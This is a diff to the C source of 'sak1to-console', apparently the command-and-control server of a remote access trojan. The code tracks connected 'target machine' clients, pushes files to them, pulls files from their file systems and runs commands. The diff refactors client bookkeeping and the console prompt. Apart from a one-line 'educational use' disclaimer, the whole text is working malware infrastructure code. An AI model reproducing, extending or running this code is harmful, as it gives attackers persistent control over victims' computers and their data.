@@ -3,13 +3,15 @@ Coded by d4rkstat1c.
 Use this code educationally/legally.
 */
 #include <unistd.h>
-#include <stdio.h>
+#include <limits.h>
 #include <fcntl.h>
 #include <netdb.h>
-#include <stdlib.h> 
-#include <string.h> 
 #include <arpa/inet.h> 
 #include <pthread.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <stdint.h>
 #include "sakito_core.h"
 #include "sakito_server_tools.h"
@@ -22,6 +24,19 @@ pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 // Variable for mutex condition.
 pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;
 
+void host_chdir(Server_map *s_map) {
+	if (chdir(s_map->buf+3) == FAILURE) {
+		switch (errno) {
+			case ENOENT:
+				printf("%s: No such file or directory\n", s_map->buf+3);
+				break;
+			case EACCES:
+				puts("Permission denied.");
+				break;
+		}
+	}
+}
+
 void terminate_server(int listen_socket, const char* const error) {
 	close(listen_socket);
 	int err_code = EXIT_SUCCESS;
@@ -31,6 +46,21 @@ void terminate_server(int listen_socket, const char* const error) {
 	}
 
 	exit(err_code);
+}
+
+void terminate_console(Server_map *s_map) {
+	// Quit accepting connections.
+	pthread_cancel(s_map->acp_thread);
+
+	// if there's any connections close them before exiting.
+	if (s_map->clients_sz) {
+		for (size_t i = 0; i < s_map->clients_sz; i++)
+			close(s_map->clients[i].sock);
+		// Free allocated memory.
+		free(s_map->clients);
+	}
+
+	terminate_server(s_map->listen_socket, NULL);
 }
  
 // Function to create socket.
@@ -70,8 +100,8 @@ void add_client(Server_map* s_map, char* const host, int client_socket) {
 	// prevent race conditions from occurring.
 	pthread_mutex_lock(&lock);
 
-	if (s_map->size == s_map->alloc)
-		s_map->clients = realloc(s_map->clients, (s_map->alloc += MEM_CHUNK) * sizeof(Conn));
+	if (s_map->clients_sz == s_map->clients_alloc)
+		s_map->clients = realloc(s_map->clients, (s_map->clients_alloc += MEM_CHUNK) * sizeof(Conn));
 
 	// When THRD_FLAG evaluates to 0: execution has ended.
 	while (s_map->THRD_FLAG)
@@ -81,9 +111,9 @@ void add_client(Server_map* s_map, char* const host, int client_socket) {
 	s_map->THRD_FLAG = 1;
 
 	// Add hostname string and client_socket file descriptor to s_map->clients structure.
-	s_map->clients[s_map->size].host = host;
-	s_map->clients[s_map->size].sock = client_socket;
-	s_map->size++;
+	s_map->clients[s_map->clients_sz].host = host;
+	s_map->clients[s_map->clients_sz].sock = client_socket;
+	s_map->clients_sz++;
 
 	// Unlock/release mutex..
 	pthread_mutex_unlock(&lock);
@@ -96,9 +126,9 @@ void add_client(Server_map* s_map, char* const host, int client_socket) {
 void* accept_conns(void* param) {
 	// Assign member values to connection map object/structure.
 	Server_map* s_map = param;
-	s_map->alloc = MEM_CHUNK;
-	s_map->size = 0;
-	s_map->clients = malloc(s_map->alloc * sizeof(Conn));
+	s_map->clients_alloc = MEM_CHUNK;
+	s_map->clients_sz = 0;
+	s_map->clients = malloc(s_map->clients_alloc * sizeof(Conn));
 	s_map->listen_socket = create_socket();
 
 	// Bind socket to port.
@@ -140,6 +170,7 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
 	// If the file exists or permission denied:
 	if (fd < 1) {
 		puts("File not found or permission denied.\n");
+
 		// Send SERVER_ERROR/'6' control code to client to force client to re-receive command.
 		if (write(client_socket, "6", 1) < 1)
 			return SOCKET_ERROR;
@@ -147,7 +178,7 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
 		return FILE_NOT_FOUND;
 	}
 
-	// '3' is the command code for uploading a file via the client.
+	// '3' is the command code for uploading a file to the client's file-system.
 	buf[7] = '3';
 
 	// Send command code + filename to be parsed.
@@ -188,7 +219,7 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
  
 // Function to receive file from target machine (TCP file transfer).
 int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
-	// '4' is the command code for downloading a file via the client.
+	// '4' is the command code for downloading a file from the client's file-system.
 	buf[9] = '4';
 
 	// Send command code + filename to be parsed.
@@ -308,8 +339,8 @@ void delete_client(Server_map* s_map, const int client_id) {
 		close(s_map->clients[client_id].sock);
 
 	// If there's more than one connection: resize the clients structure's member values.
-	if (s_map->size > 1) {
-		int max_index = s_map->size-1;
+	if (s_map->clients_sz > 1) {
+		int max_index = s_map->clients_sz-1;
 		for (size_t i = client_id; i < max_index; i++) {
 			s_map->clients[i].sock = s_map->clients[i + 1].sock;
 			s_map->clients[i].host = s_map->clients[i + 1].host;
@@ -318,7 +349,7 @@ void delete_client(Server_map* s_map, const int client_id) {
 		s_map->clients[max_index].host = NULL;
 	}
 
-	s_map->size--;
+	s_map->clients_sz--;
 
 	// Unlock/release our mutex.
 	pthread_mutex_unlock(&lock);
@@ -331,7 +362,8 @@ void delete_client(Server_map* s_map, const int client_id) {
 int validate_id(Server_map *s_map) {
 	int client_id;
 	client_id = atoi(s_map->buf+9);
-	if (!s_map->size || client_id < 0 || client_id > s_map->size - 1)
+
+	if (!s_map->clients_sz || client_id < 0 || client_id > s_map->clients_sz - 1)
 		return FAILURE;
 	else
 		return client_id;
@@ -386,25 +418,6 @@ void interact(Server_map* s_map) {
 	delete_client(s_map, client_id);
 }
 
-void host_chdir(Server_map *s_map) {
-	chdir(s_map->buf);
-}
-
-void terminate_console(Server_map *s_map) {
-	// Quit accepting connections.
-	pthread_cancel(s_map->acp_thread);
-
-	// if there's any connections close them before exiting.
-	if (s_map->size) {
-		for (size_t i = 0; i < s_map->size; i++)
-			close(s_map->clients[i].sock);
-		// Free allocated memory.
-		free(s_map->clients);
-	}
-
-	terminate_server(s_map->listen_socket, NULL);
-}
-
 // Function to execute command.
 void exec_cmd(Server_map *s_map) {
 	// Call Popen to execute command(s) and read the processes' output.
@@ -427,7 +440,8 @@ void exec_cmd(Server_map *s_map) {
 void sakito_console(Server_map *s_map) {
 	// Saktio console loop.
 	while (1) {
-		printf("sak1to-console // ");
+		getcwd(s_map->buf, BUFLEN);
+		printf("sak1to-console:~%s$ ", s_map->buf);
 		
 		// Set all bytes in buffer to zero.
 		memset(s_map->buf, '\0', BUFLEN+1);
